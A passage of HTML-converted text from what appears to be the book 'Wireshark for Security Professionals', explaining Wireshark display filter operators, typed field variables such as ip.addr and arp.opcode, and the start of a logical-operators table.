style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >ge</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=100  valign=top  style="width:60.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.2500pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >&#62;=</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=542  valign=top  style="width:325.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Greater than or equal to</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >le</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=100  valign=top  style="width:60.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.2500pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >&#60;=</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=542  valign=top  style="width:325.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Less than or equal to</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Contains</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=100  valign=top  style="width:60.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:14.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=542  valign=top  style="width:325.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Tests if the filter field contains a given value</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:38.7500pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Matches</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=100  valign=top  style="width:60.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:14.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=542  valign=top  style="width:325.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Tests a field against a Perl style regular expression</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr></table><p class=MsoNormal  style="margin-top:8.4000pt;margin-right:0.0000pt;margin-left:26.7500pt;text-indent:0.0000pt;text-align:left;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:12.5000pt;" >Source</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.6000pt;margin-right:0.0000pt;margin-left:26.7500pt;text-indent:0.0000pt;text-align:left;" ><span><a href="http://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:9.5000pt;" >http://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSecti</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.5000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you have used any modern programming language, the syntax should look familiar. To make a useful expression, you have to match these operators <a name="_bookmark38" ></a>against variables in the packet. This is possible in Wireshark by accessing variables grouped by protocol. For example, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ip.addr </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >would contain the destination and the source address. The following statement filters all the traffic coming from or going to the supplied IP address: </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ip.addr == 1.2.3.4</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This works by matching against both the destination and the source address header in the IP packet so that it will return </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >true</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for packets in both directions.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="309"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker52458.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the previous example on comparison operators, an IP address was compared to the variable </span><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-style:italic;font-size:12.0000pt;" >ip.addr</span></i><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-style:italic;font-size:12.0000pt;" >&nbsp;</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to only show traffic from and to that IP. If you were to try to compare the same variable to </span><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:12.0000pt;" >google.com</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >,</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section35" ><p class=MsoBodyText  style="margin-top:4.4000pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark would present an error message because the variable is not an IP address. The variables available to use in expressions are typed. This means that the language expects an object of a certain type to be compared only to a variable of the same type. To see the available variables and their types, you can use the Wireshark Display Filter Reference page at </span><span><a href="http://www.wireshark.org/docs/dfref/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >http://www.wireshark.org/docs/dfref/</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. In</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.6000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >practice, you can also see the values Wireshark expects for each element in the packet by inspecting the packet using the Packet Details pane. The variable names can be found on the bottom left of the screen in the status bar or looked up in the reference. The status bar lists the filter field for the selected line in the Packet Details pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For an example of this, see<a name="_bookmark39" ></a>&nbsp;</span><span><a href="#_bookmark40" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. A packet is captured, and 1 byte is highlighted in the Packet Details pane. The 1-byte portion denotes the IP version. See the lower left of the application, on the status bar: &#8220;Version (ip.version), 1 byte.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="386"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker53753.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark40" ></a><span><a href="#_bookmark39" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-4:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Field information in the status bar</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><a name="_bookmark41" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A good way to filter the available packets is to decide on an expression by inspecting a packet that interests you. It is easier to see the differentiating markers between packets you do want to see by comparing fields in the Packet Details pane. As shown in<a name="_bookmark42" ></a>&nbsp;</span><span><a href="#_bookmark43" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, each field in the ARP packet is listed with a readable value (hex in the Packet Details pane) followed by the raw value (on the right side of the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section36" ><p class=MsoBodyText  style="margin-top:3.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Packet Details pane). Both of these values can generally be used in an expression, as Wireshark transforms the readable format to the corresponding raw format for your convenience. For example, if you want to see only ARP requests in the Packet List pane, the filter would be </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp.opcode == 1</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. In this case, typing </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >request </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >would not work, because it is not a named representation of the same data. (The number 1 could mean many things.) With MAC addresses, protocol names, and so on, the named version can be used.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="318"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker54797.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark43" ></a><span><a href="#_bookmark42" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-5:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >ARP packet Opcode</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:15.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Usually a single expression is not specific enough to narrow down the stream of packets you are looking for when dealing with larger packet captures, as is the case with </span><span><a href="#_bookmark43" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. To locate the exact set of packets you want to see, you can combine expressions by logical operators.<a name="_bookmark44" ></a>&nbsp;</span><span><a href="#_bookmark45" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 1-2</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows the available operators. The symbol and English-word operator can be used interchangeably according to personal preference.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:10.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark45" ></a><span><a href="#_bookmark44" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 1-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Logical Operators</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><table class=MsoNormalTable  border=1  cellspacing=0  style="border-collapse:collapse;width:467.2500pt;margin-left:14.4000pt;mso-table-layout-alt:fixed;border:none;mso-border-left-alt:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);mso-border-insideh:1.0000pt solid rgb(191,191,191);mso-border-insidev:1.0000pt solid rgb(191,191,191);mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:38.7500pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >ENGLISH</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=76  valign=top  style="width:45.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;margin-right:1.2500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >C- LIKE</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=566  valign=top  style="width:339.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >DESCRIPTION</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td></tr><tr style="height:38.7500pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >and</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=76  valign=top  style="width:45.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.6000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >&&</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=566  valign=top  style="width:339.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:2.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Logical AND. Returns </span><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >true</span><span style="font-family:'Courier New';letter-spacing:-5.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >if both expressions are true.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:36.6000pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:0.7500pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid 